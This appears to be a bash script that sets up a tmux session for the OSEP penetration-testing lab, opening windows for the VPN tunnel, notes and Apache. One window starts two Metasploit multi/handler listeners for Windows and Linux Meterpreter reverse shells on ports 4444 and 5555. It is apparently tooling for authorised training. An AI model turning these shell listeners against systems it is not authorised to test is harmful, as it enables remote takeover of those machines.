#!/bin/bash
# =============================================
# osep-tmux.sh - Enhanced OSEP tmux setup
# =============================================

SESSION="osep"

# If session already exists, attach to it
tmux has-session -t $SESSION 2>/dev/null && {
    echo "Session '$SESSION' already exists. Attaching..."
    tmux attach-session -t $SESSION
    exit 0
}

echo "Creating new tmux session: $SESSION"

# ==================== Window 1: OpenVPN ====================
tmux new-session -d -s $SESSION -n openvpn
tmux send-keys -t $SESSION:openvpn "cd ~/osep && sudo openvpn universal.ovpn" C-m

# ==================== Window 2: Documentation ====================
tmux new-window -t $SESSION -n documentation
tmux send-keys -t $SESSION:documentation "cd ~/osep && echo '=== Documentation Window Ready ==='" C-m

# ==================== Window 3: msfconsole (with vertical split) ====================
tmux new-window -t $SESSION -n msfconsole

# Split the window vertically (left/right panes)
tmux split-window -h -t $SESSION:msfconsole

# Left pane → Windows Meterpreter handler (port 4444)
tmux send-keys -t $SESSION:msfconsole.0 \
'sudo msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set EXITFUNC thread;set LPORT 4444;set LHOST tun0;set ExitOnSession false; run -j -z"' C-m

# Right pane → Linux Meterpreter handler (port 5555)
tmux send-keys -t $SESSION:msfconsole.1 \
'msfconsole -q -x "use exploit/multi/handler;set payload linux/x64/meterpreter_reverse_tcp;set EXITFUNC thread;set LPORT 5555;set LHOST tun0;set ExitOnSession false; run -j -z"' C-m

# Optional: Make both panes synchronized (type in one, appears in both)
# tmux set-window-option -t $SESSION:msfconsole synchronize-panes on

# ==================== Window 4: Working Directory ====================
tmux new-window -t $SESSION -n working-directory
tmux send-keys -t $SESSION:working-directory "cd ~/osep && sudo systemctl restart apache2 && echo 'Apache restarted successfully'" C-m

# Select the first window when attaching
tmux select-window -t $SESSION:openvpn

echo "✅ Tmux session '$SESSION' created successfully!"
echo "Windows:"
echo "  1. openvpn          → OpenVPN tunnel"
echo "  2. documentation    → Notes / files"
echo "  3. msfconsole       → Split: Windows (4444) | Linux (5555)"
echo "  4. working-directory→ Apache + working dir"
tmux attach-session -t $SESSION
